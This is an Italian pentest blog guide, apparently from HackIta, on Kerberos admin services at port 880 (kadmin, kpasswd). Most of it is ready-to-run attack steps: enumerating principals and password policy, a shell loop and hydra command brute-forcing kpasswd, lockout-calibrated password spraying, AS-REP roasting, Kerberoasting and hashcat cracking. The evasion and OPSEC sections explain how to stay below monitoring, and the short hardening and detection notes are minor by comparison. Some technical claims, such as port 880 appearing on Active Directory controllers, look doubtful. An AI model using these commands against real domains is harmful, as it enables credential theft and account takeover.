---
title: 'Porta 880 Kerberos Admin: kadmin, kpasswd e password policy del KDC.'
slug: porta-880-kerberos-admin
description: 'Scopri cos’è la porta 880 associata ai servizi Kerberos admin legacy o custom, come si collega a kadmin e kpasswd e perché policy password, principal e configurazione del KDC sono preziosi per l’enumerazione Kerberos.'
image: /porta-880-kerberos-admin.webp
draft: true
date: 2026-04-08T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - kadmin
  - kpasswd
---

> **Executive Summary** — La porta 880 espone il servizio di amministrazione Kerberos (kadmin/kpasswd), utilizzato per la gestione delle credenziali e delle policy in ambienti Kerberos — sia Active Directory che MIT/Heimdal. La sua presenza indica un Key Distribution Center (KDC) e permette enumerazione di principal, policy password e, in caso di misconfiguration, cambio password non autorizzato o brute force diretto. Questa guida copre identificazione del servizio, enumerazione policy, password change abuse e correlazione con attacchi Kerberos su porta 88.

```id="g5v1rm"
TL;DR

- La porta 880 è il servizio kadmin/kpasswd — gestione credenziali e policy Kerberos direttamente sul KDC
- L'enumerazione delle policy password rivela lunghezza minima, complessità e lockout — parametri che guidano il password spray
- Su ambienti MIT/Heimdal Kerberos, kadmin mal configurato permette enumerazione di principal e cambio password remoto

```

Porta 880 Kerberos admin è il canale TCP del servizio di amministrazione Kerberos. Storicamente associata a `kerberos-adm`, questa porta è usata da kadmin (porta 749 su MIT Kerberos) e kpasswd (porta 464). La porta 880 vulnerabilità principali sono l'enumerazione delle password policy, il brute force su kpasswd e l'information disclosure sui principal configurati. L'enumerazione porta 880 rivela se il KDC accetta connessioni di amministrazione, quali policy sono configurate e se il servizio è raggiungibile senza autenticazione. Nel Kerberos pentest, questa porta è un indicatore diretto della presenza di un KDC e fornisce informazioni che alimentano gli attacchi sulla porta 88 (AS-REP Roasting, Kerberoasting, password spray). Nella kill chain si posiziona come recon (policy extraction) e credential attack (password change, brute force).

## 1. Anatomia Tecnica della Porta 880

La porta 880 è storicamente associata a servizi di amministrazione Kerberos. Nell'ecosistema Kerberos esistono diverse porte correlate:

| Porta   | Servizio     | Ruolo                         | Protocollo |
| ------- | ------------ | ----------------------------- | ---------- |
| **88**  | KDC (AS/TGS) | Autenticazione e ticket       | TCP/UDP    |
| **464** | kpasswd      | Cambio password               | TCP/UDP    |
| **749** | kadmin       | Amministrazione (MIT/Heimdal) | TCP        |
| **880** | kerberos-adm | Admin service (legacy/custom) | TCP        |

In ambienti Active Directory, le funzionalità admin Kerberos sono integrate nel DC (porte 88, 464, 389/636). La porta 880 appare più frequentemente su implementazioni MIT/Heimdal Kerberos (Linux, macOS Server, FreeIPA) o su configurazioni custom dove kadmin è stato riassegnato. Leggi anche [TCP](https://hackita.it/articoli/tcp) & [UDP](https://hackita.it/articoli/udp) per avere maggiori chiarezze.

Il flusso kadmin:

1. Client si connette alla porta admin (880/749)
2. Autenticazione Kerberos con principal `kadmin/admin`
3. Operazioni: list principals, get policy, change password, create principal
4. Le modifiche si propagano al database Kerberos del KDC

```
Misconfig: kadmin accessibile senza restrizioni di rete
Impatto: enumerazione principal e policy da qualsiasi host sulla rete
Come si verifica: kadmin -s [target] -p admin/admin -q "listprincs" — se risponde, è raggiungibile
```

```
Misconfig: kpasswd senza rate limiting
Impatto: brute force sulle password degli utenti Kerberos
Come si verifica: tentativi multipli rapidi di kpasswd senza blocco
```

```
Misconfig: Policy password debole o assente
Impatto: password spray efficace con poche password candidate
Come si verifica: kadmin -q "get_policy default" — rivela minlength, mincomplexity
```

## 2. Enumerazione Base

### Comando 1: Nmap

```bash
nmap -sV -sC -p 880 10.10.10.10
```

**Output atteso:**

```
PORT    STATE SERVICE        VERSION
880/tcp open  kerberos-adm?
```

**Parametri:**

* `-sV`: tenta il fingerprint del servizio — spesso risponde come `kerberos-adm` o sconosciuto
* `-sC`: script default
* `-p 880`: porta admin Kerberos

**Cosa ci dice questo output:** la porta è aperta e risponde come servizio Kerberos admin. Conferma la presenza di un KDC — verifica subito la porta 88 per conferma.

### Comando 2: Verifica porta 88 correlata

```bash
nmap -sV -p 88,464,749,880 10.10.10.10
```

**Output atteso:**

```
PORT    STATE SERVICE      VERSION
88/tcp  open  kerberos-sec Microsoft Windows Kerberos
464/tcp open  kpasswd5     
749/tcp closed kerberos-adm
880/tcp open  kerberos-adm?
```

**Cosa ci dice questo output:** la porta 88 conferma KDC Microsoft (Active Directory). La 464 aperta indica kpasswd attivo. La 880 aperta è il servizio admin aggiuntivo. La combinazione conferma un domain controller con servizi Kerberos completi.

## 3. Enumerazione Avanzata

### Password policy extraction (MIT/Heimdal)

```bash
kadmin -s 10.10.10.10 -p admin/admin -q "get_policy default"
```

**Output (accesso riuscito):**

```
Policy: default
Maximum password life: 90 days
Minimum password life: 1 day
Minimum password length: 8
Minimum number of password character classes: 3
Number of old keys kept: 5
Maximum password failures before lockout: 5
Password failure count reset interval: 30 minutes
Password lockout duration: 30 minutes
```

**Output (accesso negato):**

```
kadmin: GSS-API (or Kerberos) error while initializing
```

**Lettura dell'output:** la policy rivela tutto ciò che serve per calibrare il [password spray](https://hackita.it/articoli/bruteforce): minimo 8 caratteri, 3 classi di caratteri, lockout dopo 5 tentativi, reset dopo 30 minuti. Usa 4 tentativi max con pause di 31 minuti.

### Enumerazione principal (MIT/Heimdal)

```bash
kadmin -s 10.10.10.10 -p admin/admin -q "listprincs"
```

**Output:**

```
K/M@CORP.LOCAL
kadmin/admin@CORP.LOCAL
kadmin/changepw@CORP.LOCAL
krbtgt/CORP.LOCAL@CORP.LOCAL
host/dc01.corp.local@CORP.LOCAL
HTTP/web01.corp.local@CORP.LOCAL
MSSQLSvc/sql01.corp.local:1433@CORP.LOCAL
j.smith@CORP.LOCAL
svc_backup@CORP.LOCAL
```

**Lettura dell'output:** lista completa dei principal Kerberos — utenti, service principal (SPN) e host. `HTTP/web01` e `MSSQLSvc/sql01` sono target per [Kerberoasting](https://hackita.it/articoli/kerberos). `svc_backup` è un service account da testare.

### Password policy da Active Directory (via LDAP)

Se la 880 indica un DC Active Directory, la policy è estraibile via LDAP:

```bash
crackmapexec smb 10.10.10.10 -u user -p pass --pass-pol
```

**Output:**

```
[*] Minimum password length: 8
[*] Password history length: 24
[*] Maximum password age: 90 days
[*] Password Complexity Flags: 000001
[*] Account Lockout Threshold: 5
[*] Account Lockout Duration: 30 minutes
```

## 4. Tecniche Offensive

**Password change non autorizzato via kpasswd**

Contesto: kpasswd (464/880) accessibile. Provi a cambiare la password di un utente noto.

```bash
kpasswd j.smith@CORP.LOCAL
```

**Output (richiede vecchia password):**

```
Password for j.smith@CORP.LOCAL:
Enter new password:
```

**Output (password cambiata):**

```
Password changed.
```

**Cosa fai dopo:** se conosci la vecchia password (da credential dump precedente), puoi cambiare la password di qualsiasi utente. Con la nuova password accedi a tutti i servizi dell'utente. Per [rubare ticket Kerberos](https://hackita.it/articoli/kerberos), usa la nuova password per richiedere TGT.

**Brute force su kpasswd**

Contesto: kpasswd senza rate limiting. Provi password comuni per utenti enumerati.

```bash
# Script custom per brute force kpasswd
for user in j.smith svc_backup admin; do
  for pass in "Password1!" "Spring2026!" "Corp2026!"; do
    echo "$pass" | kpasswd $user@CORP.LOCAL 2>/dev/null && echo "FOUND: $user:$pass"
  done
done
```

**Cosa fai dopo:** credenziali trovate → accesso completo ai servizi dell'utente. Da qui, la catena dipende dai privilegi: se è Domain Admin, hai compromesso l'intero dominio.

**Correlazione con attacchi porta 88**

Contesto: la porta 880 ha fornito policy e principal. Ora attacchi sulla porta 88.

```bash
# AS-REP Roasting (utenti senza pre-auth)
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# Kerberoasting (SPN enumerati da kadmin)
GetUserSPNs.py corp.local/j.smith:Password1! -dc-ip 10.10.10.10 -request
```

**Output AS-REP:**

```
$krb5asrep$23$svc_backup@CORP.LOCAL:a1b2c3d4...
```

**Cosa fai dopo:** cracka con hashcat: `hashcat -m 18200 asrep_hashes.txt rockyou.txt`. Le informazioni dalla porta 880 (policy, principal, SPN) alimentano direttamente questi attacchi.

## 5. Scenari Pratici di Pentest

### Scenario 1: FreeIPA/MIT Kerberos con kadmin esposto

**Situazione:** ambiente Linux con FreeIPA. kadmin sulla 880 raggiungibile. Leggi anche la nostra guida completa su [kerberos](https://hackita.it/articoli/kerberos). 

**Step 1:**

```bash
nmap -sV -p 88,464,749,880 10.10.10.10
```

**Step 2:**

```bash
kadmin -s 10.10.10.10 -p admin/admin -q "listprincs"
kadmin -s 10.10.10.10 -p admin/admin -q "get_policy default"
```

**Se fallisce:**

* Causa: autenticazione Kerberos richiesta per kadmin
* Fix: usa un TGT ottenuto altrove: `kinit user@REALM` poi `kadmin -s [target]`

**Tempo stimato:** 10-20 minuti

### Scenario 2: Active Directory — porta 880 come indicator

**Situazione:** DC con porta 880 aperta. Engagement AD.

**Step 1:**

```bash
nmap -sV -p 88,389,636,880 10.10.10.10
```

**Step 2:**

```bash
# Policy via SMB/LDAP (più affidabile su AD)
crackmapexec smb 10.10.10.10 -u user -p pass --pass-pol
```

**Step 3:**

```bash
# Password spray calibrato sulla policy
crackmapexec smb 10.10.10.10 -u users.txt -p 'Spring2026!' --no-bruteforce
```

**Se fallisce:**

* Causa: lockout raggiunto
* Fix: aspetta il reset (30 min) e riduci i tentativi

**Tempo stimato:** 15-45 minuti

### Scenario 3: kpasswd brute force su utente specifico

**Situazione:** hai identificato un utente high-value (DA). kpasswd senza rate limit.

**Step 1:**

```bash
# Verifica che kpasswd risponda
echo "test" | kpasswd j.smith@CORP.LOCAL
```

**Step 2:**

```bash
# Brute force mirato
hydra -l j.smith -P /usr/share/wordlists/rockyou.txt kerberos://10.10.10.10
```

**Se fallisce:**

* Causa: lockout policy attiva
* Fix: spray lento — 1 password ogni 31 minuti per tutti gli utenti

**Tempo stimato:** variabile (minuti a ore)

## 6. Attack Chain Completa

| Fase            | Tool        | Comando                      | Risultato              |
| --------------- | ----------- | ---------------------------- | ---------------------- |
| Recon           | nmap        | `nmap -sV -p 88,464,749,880` | KDC confermato         |
| Policy          | kadmin/cme  | `get_policy` / `--pass-pol`  | Parametri spray        |
| Principal Enum  | kadmin      | `listprincs`                 | Utenti + SPN           |
| AS-REP Roast    | GetNPUsers  | `-usersfile users.txt`       | Hash utenti no-preauth |
| Kerberoast      | GetUserSPNs | `-request`                   | TGS hash               |
| Password Spray  | cme         | `-u users.txt -p pass`       | Credenziali valide     |
| Password Change | kpasswd     | `kpasswd user@REALM`         | Takeover account       |

**Timeline stimata:** 15-60 minuti per la catena recon → spray.

## 7. Detection & Evasion

### Blue Team

* **KDC log**: Event ID 4771 (Kerberos pre-auth failure), 4768 (TGT request)
* **kadmin log**: connessioni e operazioni admin (MIT: `/var/log/kadmind.log`)
* **SIEM**: brute force pattern su kpasswd, query massive listprincs

### Evasion

```
Tecnica: Password spray su porta 88 invece di 880
Come: usa AS-REQ sulla porta 88 — meno monitorata di kadmin diretto
Riduzione rumore: AS-REQ è traffico Kerberos normale
```

```
Tecnica: Enumera policy una volta sola
Come: singola query get_policy — poi usa i dati per calibrare lo spray
Riduzione rumore: una connessione a kadmin è meno visibile di query ripetute
```

## 8. Toolchain e Confronto

| Aspetto         | kadmin (880/749)      | KDC (88)     | kpasswd (464)         | LDAP (389/636)      |
| --------------- | --------------------- | ------------ | --------------------- | ------------------- |
| Ruolo           | Admin KDC             | Auth/TGS     | Password change       | Directory query     |
| Info ottenibili | Principal, policy     | TGT/TGS      | N/A (solo pwd change) | Utenti, gruppi, SPN |
| Richiede auth   | Sì (kadmin principal) | No (AS-REQ)  | Sì (old password)     | Dipende (bind)      |
| Brute force     | Possibile             | AS-REP/spray | Possibile             | N/A                 |

## 9. Troubleshooting

| Errore                      | Causa                                      | Fix                                                 |
| --------------------------- | ------------------------------------------ | --------------------------------------------------- |
| `Connection refused` su 880 | kadmin su porta diversa (749) o non attivo | Prova porta 749, 464                                |
| `GSS-API error` su kadmin   | Nessun TGT o principal errato              | `kinit user@REALM` prima di kadmin                  |
| `kpasswd: Server not found` | kpasswd non configurato o su altra porta   | Verifica DNS: `_kerberos-adm._tcp.REALM` SRV record |
| `Password change rejected`  | Non soddisfa policy complessità            | Usa password che rispetta la policy                 |
| Lockout durante brute force | Superato threshold                         | Aspetta reset interval, riduci tentativi            |

## 10. FAQ

**D: La porta 880 è presente su tutti i domain controller AD?**
R: Non di default. AD usa principalmente le porte 88 (KDC), 464 (kpasswd) e 389/636 (LDAP). La 880 appare su configurazioni custom o su implementazioni MIT/Heimdal (FreeIPA, Linux KDC).

**D: Che differenza c'è tra porta 749 e 880 per kadmin?**
R: La 749 è la porta standard IANA per kadmin (MIT Kerberos). La 880 è storicamente `kerberos-adm` e può essere usata come alternativa o in configurazioni legacy.

**D: Come proteggere il servizio kadmin?**
R: Limita l'accesso via firewall a IP admin autorizzati. Usa strong authentication per i principal admin. Abilita logging completo. Su AD, la gestione avviene via LDAP/GPO — non esporre kadmin separatamente.

## 11. Cheat Sheet Finale

| Azione                                               | Comando                                                         |
| ---------------------------------------------------- | --------------------------------------------------------------- |
| Scan                                                 | `nmap -sV -p 88,464,749,880 [target]`                           |
| Policy (MIT)                                         | `kadmin -s [target] -p admin/admin -q "get_policy default"`     |
| Principal list                                       | `kadmin -s [target] -q "listprincs"`                            |
| Policy (AD)                                          | `crackmapexec smb [DC] -u user -p pass --pass-pol`              |
| kpasswd                                              | `kpasswd user@REALM`                                            |
| AS-REP Roast                                         | `GetNPUsers.py realm/ -usersfile users.txt -dc-ip [DC]`         |
| [Kerberoast](https://hackita.it/articoli/kerberoast) | `GetUserSPNs.py realm/user:pass -dc-ip [DC] -request`           |
| Spray                                                | `crackmapexec smb [DC] -u users.txt -p 'Pass!' --no-bruteforce` |

### Perché Porta 880 è rilevante nel 2026

La porta 880 è un indicatore diretto di un KDC Kerberos. Su ambienti MIT/Heimdal (FreeIPA, macOS Server), kadmin esposto permette enumerazione completa di principal e policy. Su AD, conferma il DC e fornisce un vettore aggiuntivo per il password change. Le informazioni estratte alimentano direttamente Kerberoasting, AS-REP Roasting e password spray.

### Hardening

* Firewall: limita 880/749 a IP di amministrazione
* kadmin: usa principal admin con password forte e 2FA se supportato
* Policy: minima 14 caratteri, 4 classi, lockout 5 tentativi / 30 min reset
* Log: abilita kadmind logging e forwarda a SIEM

### OPSEC

kadmin è raramente monitorato rispetto alla porta 88. Una singola query policy è quasi invisibile. Il brute force su kpasswd genera log ma è meno monitorato di AS-REQ failure sulla 88. Usa la policy estratta per calibrare lo spray sulla 88 — dove il traffico si mimetizza meglio.

***

Riferimento: RFC 4120 (Kerberos), MIT kadmin documentation. Uso esclusivo in ambienti autorizzati. Approfondimento: [https://www.speedguide.net/port.php?port=880](https://www.speedguide.net/port.php?port=880)

> Vuoi supportare HackIta? [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
